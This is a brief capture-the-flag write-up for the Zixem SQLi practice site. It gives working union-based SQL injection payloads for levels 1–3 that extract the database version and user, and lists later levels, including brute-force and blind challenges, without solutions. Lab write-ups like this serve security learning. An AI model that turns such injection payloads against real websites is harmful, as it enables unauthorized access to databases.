## Zixem SQLi

[[Zixem SQLi](http://www.zixem.altervista.org/SQLi/)]

> #### RULES
>
> Use only **UNION BASED!**
>
> Your mission is to select only the **version** & **user** and to **take screenshot** as proof.

## Write Up

#### SQLi challenges

| [Level 1](http://www.zixem.altervista.org/SQLi/level1.php?id=1) | Super Easy |
| ------- | ---------- |

 `?id=-9999 union select version(),user(),3; --`

| [Level 2](http://www.zixem.altervista.org/SQLi/level2.php?showprofile=4) | Easy |
| ------- | ---------- |

 `?showprofile=-9999' union select user(),version(),3,4 -- -`

| [Level 3](http://www.zixem.altervista.org/SQLi/level3.php?item=3) | Medium |
| ------- | ---------- |

 `?item=-9999' unionon select user(),version(),3,4; -- -`

| [Level 4](http://www.zixem.altervista.org/SQLi/level4.php?ebookid=7) | Normal |
| ------- | ---------- |

| [Level 7](http://www.zixem.altervista.org/SQLi/level7.php?id=1) | Medium |
| ------- | ---------- |

| [Level 8](http://www.zixem.altervista.org/SQLi/lvl8.php?id=1) | Hard |
| ------- | ---------- |

| [Level 9](http://www.zixem.altervista.org/SQLi/lvl9.php?id=1) | Medium |
| ------- | ---------- |

| [Level 10](http://www.zixem.altervista.org/SQLi/lvl10.php?x=ISwwYGAKYAo%3D) | Pro |
| ------- | ---------- |

#### BF challenges

| [Level 5](http://www.zixem.altervista.org/SQLi/login_lvl5.php) | Hard |
| ------- | ---------- |

#### SQLi-Blind challenges

| [Level 6](http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10) | Expererinced |
| ------- | ---------- |
